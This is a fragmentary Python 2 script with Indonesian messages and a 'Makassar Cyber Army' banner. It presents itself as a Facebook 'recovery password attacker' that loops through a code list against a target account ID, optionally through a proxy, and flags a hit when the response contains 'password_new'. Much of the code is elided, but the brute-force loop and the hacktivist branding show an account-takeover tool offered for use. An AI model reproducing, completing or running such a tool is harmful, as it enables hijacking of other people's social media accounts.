...
print '''
              ...
              MAKASSAR CYBER ARMY
           CODE: BY DARK•PSYCHO
     FACEBOOK RECOVERY PASSWORD ATTACKER #SALAMHACKTIVIS
...
if len(sys.argv) != 3:
    print "\n\n[#] Penulisan: python2 fb.py [TargetID] [listkode.txt] "
    sys.exit()
...
while True:
    ...
    if choice=="1":
        try:
            ...
            print "[-] Hanya dalam Format .txt Blabla"
            sys.exit(1);
        ...
        for w in word:
            ...
            if search:
                print "[+] Kode Yang Ini "+w+" Bener anda beruntung^___^ "
            else:
                print "[+] Kode Yangini "+w+" Salah sobat >:( "
    else:

        print """

        Selamat Datang Di Tools MAKASSAR CYBER ARMY Masukan Proxy:Port Anda sobat :)
        ...
        try:
            ...
            print "[-] Yang Ini Gabisa Di Pake Sobatku !!"
            sys.exit(1);
        ...
        for w in word:
            ...
            try:
                ...
                print " Erorrr! halamannya tidak bisa dimuat "
        
            search = re.search('password_new', get)
            if search:
                print "[+] Kodenya yang ini "+w+" Benar sobat "
            else:
                print "[+] Kode Yang Ini "+w+" Gabisa Dipakai sobat "